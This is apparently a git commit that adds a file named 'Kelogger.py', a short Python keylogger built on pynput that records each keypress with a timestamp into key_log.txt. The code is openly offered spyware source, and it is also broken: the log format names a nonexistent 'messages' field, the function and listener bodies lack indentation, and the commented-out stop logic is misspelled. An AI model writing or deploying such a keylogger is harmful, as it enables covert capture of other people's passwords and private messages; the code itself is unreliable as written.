24029473d1619e3ba9ef11167a73bbaf5bb64d66
MuneeburRehmanz <149325914+MuneeburRehmanz@users.noreply.github.com>
2024-05-09 13:39:45 +0500

    Kelogger.py

---
+++ Kelogger.py
@@ -0,0 +1,15 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = ""
+
+logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(messages)s:')
+
+def on_press(key):
+logging.info(str(key))
+  #if key == key.esc:
+    # stop istener
+      #return false
+
+with Listener(on_press=on_press) as listener:
+listener.join()
